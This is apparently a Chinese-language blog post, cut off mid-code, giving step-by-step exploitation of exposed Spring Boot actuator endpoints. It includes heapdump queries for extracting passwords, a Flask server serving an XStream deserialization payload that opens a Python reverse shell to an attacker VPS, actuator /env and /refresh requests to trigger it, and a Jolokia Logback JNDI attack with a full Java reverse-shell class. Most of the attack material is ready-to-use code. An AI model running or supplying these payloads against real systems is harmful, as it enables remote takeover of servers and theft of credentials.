<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Springboot利用</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Springboot利用</h2><h1 id="0x1-heapdump密码导出"><a href="#0x1-heapdump密码导出" class="headerlink" title="0x1. heapdump密码导出"></a>0x1. heapdump密码导出</h1><ul>
<li>heapdump ，快照导出</li>
</ul>
<blockquote>
<p>需要能访问到 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口 </p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit#0x06restart-h2-database-query-rce:~:text=Eclipse%20Memory%20Analyzer">工具下载链接</a> ，使用以下语句进行搜索：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs SQL"># 搜索password等关键字<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> java.util.Hashtable$Entry x <span class="hljs-keyword">WHERE</span> (toString(x.key).<span class="hljs-keyword">contains</span>(&quot;password&quot;))<br># 或<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> java.util.LinkedHashMap$Entry x <span class="hljs-keyword">WHERE</span> (toString(x.key).<span class="hljs-keyword"><code class="language-hljs SQL"># 搜索password等关键字<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> java.util.Hashtable$Entry x <span class="hljs-keyword">WHERE</span> (toString(x.key).<span class="hljs-keyword">contains</span>(&quot;password&quot;))<br># 或<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> java.util.LinkedHashMap$Entry x <span class="hljs-keyword">WHERE</span> (toString(x.key).<span class="hljs-keyword">contains</span>("password"))<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">工具2</a> ，推荐</p>
<h1 id="0x2-Eureka-Xstream-Deserialization-RCE"><a href="#0x2-Eureka-Xstream-Deserialization-RCE" class="headerlink" title="0x2. Eureka Xstream Deserialization RCE"></a>0x2. Eureka Xstream Deserialization RCE</h1><p>利用条件：</p>
<ul>
<li><p>POST访问 /env 、/refresh接口设置、刷新</p>
</li>
<li><p>存在Eureke-client &lt; 1.8.7</p>
<blockquote>
<p>在env中可以搜 netflix 判断是否存在依赖 </p>
<p>com.netflix.servo.DefaultMonitorRegistry.registryClass    “com.netflix.servo.BasicMonitorRegistry”</p>
</blockquote>
<p>eureka-client 自带xstream依赖</p>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721103215469.png" alt="image-20220721103215469" style="zoom:25%;"></li>
</ul>
<p>利用：</p>
<ol>
<li>搭建xstream payload 网站 和 反弹shell ，如果是Windows 可以直接下载exe上线</li>
</ol>
<p>注意这个xml序列化执行的命令是Linux下的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">catch_all</span>(<span class="hljs-params">path</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span><br><span class="hljs-string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="hljs-string">      &lt;dataHandler&gt;</span><br><span class="hljs-string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="hljs-string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="hljs-string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="hljs-string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="hljs-string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="hljs-string">                    &lt;command&gt;</span><br><span class="hljs-string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span><br><span class="hljs-string">                    &lt;/command&gt;</span><br><span class="hljs-string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="hljs-string">                  &lt;/next&gt;</span><br><span class="hljs-string">                &lt;/iter&gt;</span><br><span class="hljs-string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="hljs-string">                  &lt;method&gt;</span><br><span class="hljs-string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="hljs-string">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="hljs-string">                    &lt;parameter-types/&gt;</span><br><span class="hljs-string">                  &lt;/method&gt;</span><br><span class="hljs-string">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="hljs-string">                &lt;/filter&gt;</span><br><span class="hljs-string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="hljs-string">              &lt;/serviceIterator&gt;</span><br><span class="hljs-string">              &lt;lock/&gt;</span><br><span class="hljs-string">            &lt;/cipher&gt;</span><br><span class="hljs-string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="hljs-string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="hljs-string">          &lt;/is&gt;</span><br><span class="hljs-string">        &lt;/dataSource&gt;</span><br><span class="hljs-string">      &lt;/dataHandler&gt;</span><br><span class="hljs-string">    &lt;/value&gt;</span><br><span class="hljs-string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Response(xml, mimetype=<span class="hljs-string">&#x27;application/xml&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number"><code class="language-hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, defaults=&#123;<span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;</span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">catch_all</span>(<span class="hljs-params">path</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span><br><span class="hljs-string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="hljs-string">      &lt;dataHandler&gt;</span><br><span class="hljs-string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="hljs-string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="hljs-string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="hljs-string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="hljs-string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="hljs-string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="hljs-string">                    &lt;command&gt;</span><br><span class="hljs-string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;-c&lt;/string&gt;</span><br><span class="hljs-string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span><br><span class="hljs-string">                    &lt;/command&gt;</span><br><span class="hljs-string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="hljs-string">                  &lt;/next&gt;</span><br><span class="hljs-string">                &lt;/iter&gt;</span><br><span class="hljs-string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="hljs-string">                  &lt;method&gt;</span><br><span class="hljs-string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="hljs-string">                    &lt;name&gt;start&lt;/name&gt;</span><br><span class="hljs-string">                    &lt;parameter-types/&gt;</span><br><span class="hljs-string">                  &lt;/method&gt;</span><br><span class="hljs-string">                  &lt;name&gt;foo&lt;/name&gt;</span><br><span class="hljs-string">                &lt;/filter&gt;</span><br><span class="hljs-string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span><br><span class="hljs-string">              &lt;/serviceIterator&gt;</span><br><span class="hljs-string">              &lt;lock/&gt;</span><br><span class="hljs-string">            &lt;/cipher&gt;</span><br><span class="hljs-string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span><br><span class="hljs-string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span><br><span class="hljs-string">          &lt;/is&gt;</span><br><span class="hljs-string">        &lt;/dataSource&gt;</span><br><span class="hljs-string">      &lt;/dataHandler&gt;</span><br><span class="hljs-string">    &lt;/value&gt;</span><br><span class="hljs-string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="hljs-string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> Response(xml, mimetype=<span class="hljs-string">&#x27;application/xml&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure>

<p>接受反弹shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">root@ubuntu:~# nc -nlp 6666<br></code></pre></td></tr></table></figure>



<p>如果是Windows 无法反弹，可以测试DNSLOG，上线CS</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd.exe<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>ping -n 1 29quaf.dnslog.cn<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd.exe<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>ping -n 1 29quaf.dnslog.cn<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">command</span>></span><br></code></pre></td></tr></table></figure>



<ol start="2">
<li>更改eureka属性去请求payload</li>
</ol>
<p>spring 1.x</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http:<span class="hljs-comment"><code class="language-hljs stata"><span class="hljs-keyword">POST</span> /env<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br><br>eureka.client.serviceUrl.defaultZone=http:<span class="hljs-comment">//your-vps-ip/example</span><br></code></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs awk">POST <span class="hljs-regexp">/actuator/</span>env<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string"><code class="language-hljs awk">POST <span class="hljs-regexp">/actuator/</span>env<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">"http://your-vps-ip/example"</span>&#125;<br></code></pre></td></tr></table></figure>



<ol start="3">
<li>刷新配置让属性生效</li>
</ol>
<p>spring 1.x</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword"><code class="language-hljs stata"><span class="hljs-keyword">POST</span> /refresh<br>Content-<span class="hljs-keyword">Type</span>: application/x-www-<span class="hljs-keyword">form</span>-urlencoded<br></code></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type"><code class="language-hljs pgsql">POST /actuator/<span class="hljs-keyword">refresh</span><br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>检查配置是否生效</li>
</ol>
<p>访问/env，搜索变量<code>eureka.client.serviceUrl.defaultZone</code> 查看是否设置生效</p>
<p><img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721083549618.png" alt="image-20220721083549618"></p>
<ol start="5">
<li>Windows环境，收到DNSLOG</li>
</ol>
<img src="/2022/07/05/Springboot%E5%88%A9%E7%94%A8/image-20220721102855318.png" alt="image-20220721102855318" style="zoom:25%;">



<h1 id="0x3-Jolokia-Logback-JNDI-RCE"><a href="#0x3-Jolokia-Logback-JNDI-RCE" class="headerlink" title="0x3. Jolokia Logback JNDI RCE"></a>0x3. Jolokia Logback JNDI RCE</h1><p>Jolokia<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/2.1.1.RELEASE/reference/html/production-ready-jmx.html">官方</a>给的解释为JMX的web管理工具，用来管理JMX bean:</p>
<blockquote>
<p>Jolokia is a JMX-HTTP bridge that provides an alternative method of accessing JMX beans. To use Jolokia, include a dependency to <code>org.jolokia:jolokia-core</code>. For example, with Maven, you would add the following dependency:</p>
</blockquote>
<p>当环境中的Logback配置文件可控时，即可触发JNDI，而jolokia正好可以控制、设置这个属性</p>
<p>利用前提：</p>
<ul>
<li>jdk环境满足jndi</li>
<li>存在合适的MBeans</li>
</ul>
<blockquote>
<p>访问 <strong>/jolokia/list</strong> 接口，查看是否存在 <strong>ch.qos.logback.classic.jmx.JMXConfigurator</strong> 和 <strong>reloadByURL</strong> 关键词。</p>
</blockquote>
<p><strong>利用：</strong></p>
<blockquote>
<p>主要思路，通过jolokia设置logback的配置文件为远端xml，加载jndi</p>
</blockquote>
<ol>
<li>配置用来JNDI注入的logback配置文件：</li>
</ol>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name"><code class="language-hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">insertFromJNDI</span> <span class="hljs-attr">env-entry-name</span>=<span class="hljs-string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;appName&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>></span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>配置JNDI LDAP环境：</li>
</ol>
<p>编译低版本的class</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs shell"><code class="language-hljs shell">root@ubuntu:~# javac -source 1.5 -target 1.5 JNDIObject.java<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">// JNDIObject.java</span><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JNDIObject</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            String ip = <span class="hljs-string">&quot;your-vps-ip&quot;</span>;<br>            String port = <span class="hljs-string">&quot;443&quot;</span>;<br>            String py_path = <span class="hljs-keyword">null</span>;<br>            String[] cmd;<br>            <span class="hljs-keyword">if</span> (!System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                String[] py_envs = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/python&quot;</span>, <span class="hljs-string">&quot;/bin/python3&quot;</span>, <span class="hljs-string">&quot;/usr/bin/python&quot;</span>, <span class="hljs-string">&quot;/usr/bin/python3&quot;</span>, <span class="hljs-string">&quot;/usr/local/bin/python&quot;</span>, <span class="hljs-string">&quot;/usr/local/bin/python3&quot;</span>&#125;;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; py_envs.length; ++i) &#123;<br>                    String py = py_envs[i];<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(py)).exists()) &#123;<br>                        py_path = py;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (py_path != <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>                        <span class="hljs-comment">// 注意下面这个转译，否则无法编译 </span><br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;py_path, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;</span>&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-comment">// 注意下面这个转译，否则无法编译 </span><br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;py_path, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;</span>&#125;;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>&#125;;<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cmd = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>&#125;;<br>            &#125;<br>            Process p = (<span class="hljs-keyword">new</span> ProcessBuilder(cmd)).redirectErrorStream(<span class="hljs-keyword">true</span>).start();<br>            Socket s = <span class="hljs-keyword">new</span> Socket(ip, Integer.parseInt(port));<br>            InputStream pi = p.getInputStream();<br>            InputStream pe = p.getErrorStream();<br>            InputStream si = s.getInputStream();<br>            OutputStream po = p.getOutputStream();<br>            OutputStream so = s.getOutputStream();<br>            <span class="hljs-keyword">while</span>(!s.isClosed()) &#123;<br>                <span class="hljs-keyword">while</span>(pi.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    so.write(pi.read());<br>                &#125;<br>                <span class="hljs-keyword">while</span>(pe.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    so.write(pe.read());<br>                &#125;<br>                <span class="hljs-keyword">while</span>(si.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                    po.write(si.read());<br>                &#125;<br>                so.flush();<br>                po.flush();<br>                Thread.sleep(<span class="hljs-number">50L</span>);<br>                <span class="hljs-keyword">try</span> &#123;<br>                    p.exitValue();<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                &#125;<br>            &#125;<br>            p.destroy();<br>            s.close();<br>        &#125;<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-comment">// JNDIObject.java</span><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JNDIObject</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            String ip = <span class="hljs-string">&quot;your-vps-ip&quot;</span>;<br>            String port = <span class="hljs-string">&quot;443&quot;</span>;<br>            String py_path = <span class="hljs-keyword">null</span>;<br>            String[] cmd;<br>            <span class="hljs-keyword">if</span> (!System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;windows&quot;</span>)) &#123;<br>                String[] py_envs = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;/bin/python&quot;</span>, <span class="hljs-string">&quot;/bin/python3&quot;</span>, <span class="hljs-string">&quot;/usr/bin/python&quot;</span>, <span class="hljs-string">&quot;/usr/bin/python3&quot;</span>, <span class="hljs-string">&quot;/usr/local/bin/python&quot;</span>, <span class="hljs-string">&quot;/usr/local/bin/python3&quot;</span>&#125;;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; py_envs.length; ++i) &#123;<br>                    String py = py_envs[i];<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(py)).exists()) &#123;<br>                        py_path = py;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (py_path != <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>                        <span class="hljs-comment">// 注意下面这个转译，否则无法编译 </span><br>                        cmd = <span class="hljs-keyword">new</span> String[]&#123;py_path, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;</span>&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span 